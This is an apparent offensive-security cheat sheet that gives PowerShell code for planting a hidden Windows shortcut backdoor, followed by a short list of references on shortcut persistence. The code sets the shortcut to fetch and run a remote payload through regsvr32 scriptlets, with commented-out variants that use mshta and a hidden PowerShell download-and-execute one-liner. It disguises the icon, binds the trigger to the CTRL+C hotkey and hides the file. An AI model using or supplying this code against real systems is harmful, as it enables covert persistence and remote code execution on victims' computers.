# Shortcut Links

## 1.1 - Create shortcut backdoor in powershell

- Note: The **TargetPath** has a limit of 260 characters long

```powershell
$shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)

## Scriptlet files .sct
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'

# For HTA files
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = 'http://<IP>/shell.hta'

# For conhost.exe and powershell one-liner
# $Shortcut.TargetPath = 'conhost.exe'
# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"
$Shortcut.Save()
attrib +h $shortcutPath
```

---
## References

- [SS64 Shortcut](https://ss64.com/nt/shortcut.html)

- [Shellgeek: Create Shortcuts on User Desktop Using Powershell](https://shellgeek.com/create-shortcuts-on-user-desktop-using-powershell/)

- [Hull1.com: Customize Shortcut Icon](https://www.hull1.com/scriptit/2020/08/15/customize-shortcut-icon.html)

- [Simontimms: Creating a Shortcut](https://blog.simontimms.com/2021/05/10/creating-a-shortcut/)

- [Uperesia Booby Trapped Shortcut](https://www.uperesia.com/booby-trapped-shortcut)

- [Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)

- [Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)